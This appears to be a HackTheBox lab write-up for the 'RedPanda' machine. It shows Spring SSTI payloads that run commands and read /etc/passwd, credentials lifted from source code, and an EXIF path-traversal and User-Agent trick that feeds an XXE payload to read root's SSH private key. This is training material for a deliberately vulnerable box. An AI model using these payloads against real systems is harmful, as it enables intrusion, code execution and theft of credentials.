---
title: HTB | RedPanda
author: Zeropio
date: 2022-08-27
categories: [Pentesting, HackTheBox]
tags: [htb, linux, easy, machines]
permalink: /pentesting/htb/machines/redpanda
image:
  path: /assets/img/hackthebox/card/RedPanda.png
  width: 800
  height: 500
---

# Footprinting

We start with a nmap to the discover ports:

```
Nmap scan report for 10.10.11.170
Host is up (0.072s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
|_http-title: Red Panda Search | Made with Spring Boot
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Sat, 27 Aug 2022 21:13:22 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
...

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

 If we check the webpage we will find the following page:

![Untitled](/assets/img/hackthebox/labs/redpanda/Untitled.png)

# Foothold

We can try several payloads, until we find that  `*{7*7}` the output is `49`.  If we try the following payload:

```jsx
*{class.getResource("").getPath()}
```

We will get **Whitelabel Error Page**. Searching it, we will find that is about **Spring Boot**. The following payload, from PayloadAllTheThings will work:

```jsx
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

It will give us the `/etc/passwd`{: .filepath}. We can use [this]([https://raw.githubusercontent.com/VikasVarshney/ssti-payload/master/ssti-payload.py](https://raw.githubusercontent.com/VikasVarshney/ssti-payload/master/ssti-payload.py)) script to execute a webshell as follows to create our payloads:

```console
zero@pio$ ./ssti-payload.py

Command ==> id
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

With this we can generate our payloads to move on, start by getting our user with a `whoami` (and replacing all the `$` by `*` . 

We can search in the config file: `/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java` {: .filepath}. There we can see the escaped characters (not the `*` ) and a pair of credentials ( **woodenk**:**RedPandazRule** ), we can try ssh with them:

```console
zero@pio$ ssh woodenk@<IP>
```

# Privilege Escalation

If we run:

```console
woodenk@redpanda:~$ ps aux | grep root

root         866  0.0  0.0   2608   600 ?        Ss   16:54   0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
```

We can see that root user is executing something with our user. Inside the `/opt` {: .filepath} we can see some kind of scripts with the following content:

```bash
#!/bin/bash
/usr/bin/find /tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.jpg" -exec rm -rf {} \;
```

We can see that it is deleting files with the XML version. If we go back to the webpage, we can see that in the userâ€™s profiles we can download an XML about them.

In the previous file we can found how the XML is exported. If we check on the folder of the script we can find another file that is using the User-Agent:

```java
public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
```

And below the metadata of a file with a *Artist* parameter:

```java
public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
```

We could try to do a XXE and aim the metadata of this file to this malicious file. The `exiftool` could be useful to inject metadata inside an image:

```console
zero@pio$ exiftool -Artist="../../../../../../../../../home/woodenk/xxe" dog.jpeg
```

As the program add `_creds.xml` to the file name we just need to name the name before. Create the XML file (must have the same parameters as the others):

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../../home/woodenk/dog.jpeg</uri>
    <privesc>&xxe;</privesc>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

Call the image:

```console
zero@pio$ curl http://10.10.11.170:8080 -H "User-Agent: ||/../../../../../../../home/woodenk/dog.jpeg"
```

And download the XML from the user. Check again the XXE and we should have the root RSA there.
